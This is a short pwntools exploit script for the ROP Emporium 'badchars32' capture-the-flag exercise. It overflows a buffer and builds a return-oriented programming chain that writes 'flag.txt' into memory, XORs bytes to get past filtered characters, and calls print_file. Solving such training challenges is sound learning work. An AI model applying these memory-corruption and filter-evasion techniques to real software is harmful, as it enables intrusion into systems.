from pwn import *

elf = ELF("./badchars32")

p = elf.process()
raw_input("DEBUG")

pop_ebx_esi_edi_ebp = 0x080485b8
mov_edi_esi = 0x0804854f
xor_ebp_bl = 0x08048547
pop_ebp = 0x080485bb
pop_ebx = 0x0804839d

bss = 0x804a030

payload = b"A"*44
payload += p32(pop_ebx_esi_edi_ebp)
payload += p32(0x8A)
payload += b"flag"
payload += p32(bss)
payload += p32(bss+2)
payload += p32(mov_edi_esi)
payload += p32(xor_ebp_bl)
payload += p32(pop_ebx)
payload += p32(0x8C)
payload += p32(pop_ebp)
payload += p32(bss+3)
payload += p32(xor_ebp_bl)
payload += p32(pop_ebx_esi_edi_ebp)
payload += p32(0xC5)
payload += b".txt"
payload += p32(bss+4)
payload += p32(bss+4)
payload += p32(mov_edi_esi)
payload += p32(xor_ebp_bl)
payload += p32(pop_ebx)
payload += p32(0x93)
payload += p32(pop_ebp)
payload += p32(bss+6)
payload += p32(xor_ebp_bl)
payload += p32(elf.sym['print_file'])
payload += b"B"*4
payload += p32(bss)




p.sendline(payload)

p.interactive()

